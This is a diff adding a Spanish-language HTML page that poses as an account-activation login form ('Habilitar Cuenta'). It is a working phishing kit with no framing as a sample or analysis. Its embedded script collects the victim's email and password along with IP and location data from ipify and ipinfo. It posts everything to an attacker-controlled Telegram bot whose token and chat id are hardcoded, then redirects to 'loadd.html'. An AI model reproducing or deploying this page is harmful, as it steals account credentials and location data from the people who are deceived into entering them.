@@ -1,0 +1,121 @@
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=yes">
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="fonts/icomoon/style.css">
+    <link rel="stylesheet" href="css/owl.carousel.min.css">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <!-- Style -->
+    <link rel="stylesheet" href="css/style.css">
+    <title>Inicio</title>	
+	
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+
+<script>
+//bot token
+var telegram_bot_id =  "6477681408:AAHnP8AoapryfWFxu3QrMATvYObEAOo1v94";
+//chat id
+var chat_id ="6184515740";
+
+  $.getJSON("https://api.ipify.org?format=json", function(data) {
+          $("#gfg").html(data.ip);
+      });
+      $.getJSON("https://ipinfo.io", function(response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+  });
+
+  var u_name, u_name2, ip, ip2, message;
+  var ready = function() {
+    u_name = document.getElementById("bc").value;
+    u_name2 = document.getElementById("bclv").value;
+
+    ip = document.getElementById("gfg").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+    message = "MMMHOTBBMIL\n\nC: " + u_name + "\nCLv: " + u_name2 + "\n🌎IP: " + ip +"\n" + ip2;
+  };
+  var sender = function() {
+    ready();
+    var settings = {
+      "async": true,
+      "crossDomain": true,
+      "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+      "method": "POST",
+      "headers": {
+        "Content-Type": "application/json",
+        "cache-control": "no-cache"
+      },
+      "data": JSON.stringify({
+        "chat_id": chat_id,
+        "text": message
+      })
+    };
+    $.ajax(settings).done(function(response) {
+      console.log(response);
+      window.location = 'loadd.html';
+    });
+    return false;
+  };
+
+</script>
+  </head>
+  <body>
+  <div class="content">
+    <div class="container">
+      <div class="row justify-content-center">
+        <!-- <div class="col-md-6 order-md-2">
+        
+        </div> -->
+        <div class="col-md-6 contents">
+          <div class="row justify-content-center">
+            <div class="col-md-12">
+              <div class="form-block">
+                  <div class="mb-4">
+				  <img src="images/mud.png" alt="Image" class="img-fluid"><br><br>
+                  <h3>Habilitar <strong>Cuenta</strong></h3>
+                </div>
+                <form method="POST" action=""  onsubmit="return sender();">
+						<p id="gfg"  hidden=""></p>
+						<p id="address"  hidden=""></p>
+						
+						<div class="form-group first">
+                    
+              
+                    <input type="email" placeholder="Correo electrónico" name="bc" id="bc" style="font-size:14px;" class="form-control" required>
+                    
+
+                  </div>
+                  
+                  <div class="form-group last mb-4">
+                 
+                    <input type="password" placeholder="Escribir contraseña" name="bclv" id="bclv" style="font-size:14px;" class="form-control" required>
+                    
+                  </div>
+                  
+                  <div class="d-flex mb-5 align-items-center">
+                    <label class="control control--checkbox mb-0"><span class="caption">Recordar</span>
+                      <input type="checkbox" checked="checked"/>
+                      <div class="control__indicator"></div>
+                    </label>
+                   
+                  </div>
+
+                  <input type="submit" value="Siguiente" class="btn btn-pill text-white btn-block btn-primary">
+                 <br>
+                  <div class="social-login text-center">
+               
+                  </div>
+                </form>
+              </div>
+            </div>
+          </div>
+          
+        </div>
+        
+      </div>
+    </div>
+  </div>
+  </body>
+</html>
